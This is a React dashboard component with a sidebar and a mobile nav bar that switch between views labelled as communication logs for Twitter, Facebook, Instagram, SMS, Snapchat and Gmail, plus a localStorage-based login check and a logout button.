/* eslint-disable no-unused-vars */
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import {
  FaFacebookMessenger,
  FaSnapchatGhost,
  FaInstagramSquare,
} from "react-icons/fa";
import { BsTwitterX } from "react-icons/bs";
import { MdHome, MdLogout, MdSms } from "react-icons/md";
import { IoCallSharp } from "react-icons/io5";
import { Mail, Fbchat, Instachat, Sms, Snap, Xchat } from "../components";

const navLinks = [
  {
    id: "dashboard",
    name: "Dashboard",
  },
  {
    id: "twitter",
    name: "Twitter Logs",
  },
  {
    id: "facebook",
    name: "Facebook Logs",
  },
  {
    id: "instagram",
    name: "Instagram Logs",
  },
  {
    id: "sms",
    name: "SMS Logs",
  },
  {
    id: "snap",
    name: "Snapchat Logs",
  },
  {
    id: "call",
    name: "Gmail Logs",
  },
];

const Dash = () => {
  const navigate = useNavigate();
  const user = JSON.parse(localStorage.getItem("user"));

  const [active, setActive] = useState("dashboard");

  useEffect(() => {
    if (!user) {
      navigate("/");
    }
  }, [user, navigate]);

  useEffect(() => {
    document.title = "Dashboard";
  }, []);

  return (
    <section className="h-screen w-full flex overflow-hidden">
      <aside className="hidden md:flex md:w-[320px] lg:w-[280px] flex-col max-h-screen bg-black text-slate-100">
        <h3 className="p-4 text-black bg-white">Communication logs</h3>
        <hr />
        <ul className=" flex flex-col gap-2">
          {navLinks.map((link) => {
            const icons =
              link.id === "twitter" ? (
                <BsTwitterX />
              ) : link.id === "facebook" ? (
                <FaFacebookMessenger />
              ) : link.id === "instagram" ? (
                <FaInstagramSquare />
              ) : link.id === "sms" ? (
                <MdSms />
              ) : link.id === "snap" ? (
                <FaSnapchatGhost />
              ) : link.id === "call" ? (
                <IoCallSharp />
              ) : (
                <MdHome />
              );
            return (
              <li
                key={link.id}
                onClick={() => setActive(link.id)}
                className={`${
                  active === link.id ? "text-cyan-600" : ""
                } flex items-center gap-2 border-b py-2 px-4 cursor-pointer hover:text-cyan-500`}
              >
                <span>{icons}</span>
                <span>{link.name}</span>
              </li>
            );
          })}
          <li
            onClick={() => {
              localStorage.removeItem("user");
              navigate("/");
            }}
            className="flex items-center gap-2 border-b p-2 cursor-pointer hover:text-cyan-500 py-2 px-4"
          >
            <MdLogout />
            <span>Logout</span>
          </li>
        </ul>
      </aside>
      <div className="bg-slate-100 w-full">
        {active === "dashboard" ? (
          <div className="">
            <p>
              Welcome to your dashboard{" "}
              <span className="font-bold">{user.email}</span>
            </p>
          </div>
        ) : active === "twitter" ? (
          <Xchat />
        ) : active === "facebook" ? (
          <Fbchat />
        ) : active === "instagram" ? (
          <Instachat />
        ) : active === "sms" ? (
          <Sms />
        ) : active === "snap" ? (
          <Snap />
        ) : active === "call" ? (
          <Mail />
        ) : null}
      </div>
      <aside className="sm:hidden absolute bottom-0 bg-black text-white w-full">
        <ul className=" grid grid-cols-2 w-full">
          {navLinks.map((link) => {
            const icons =
              link.id === "twitter" ? (
                <BsTwitterX />
              ) : link.id === "facebook" ? (
                <FaFacebookMessenger />
              ) : link.id === "instagram" ? (
                <FaInstagramSquare />
              ) : link.id === "sms" ? (
                <MdSms />
              ) : link.id === "snap" ? (
                <FaSnapchatGhost />
              ) : link.id === "call" ? (
                <IoCallSharp />
              ) : (
                <MdHome />
              );
            return (
              <li
                key={link.id}
                onClick={() => setActive(link.id)}
                className={`${
                  active === link.id
                    ? "bg-white text-black border-slate-800"
                    : ""
                } flex items-center gap-2 border py-2 px-4 cursor-pointer hover:text-cyan-500 text-xs`}
              >
                <span>{icons}</span>
                <span>{link.name.split(" ")[0]}</span>
              </li>
            );
          })}
          <li
            onClick={() => {
              localStorage.removeItem("user");
              navigate("/");
            }}
            className="flex items-center gap-2 border-b p-2 cursor-pointer py-2 px-4 text-xs"
          >
            <MdLogout />
            <span>Logout</span>
          </li>
        </ul>
      </aside>
    </section>
  );
};

export default Dash;
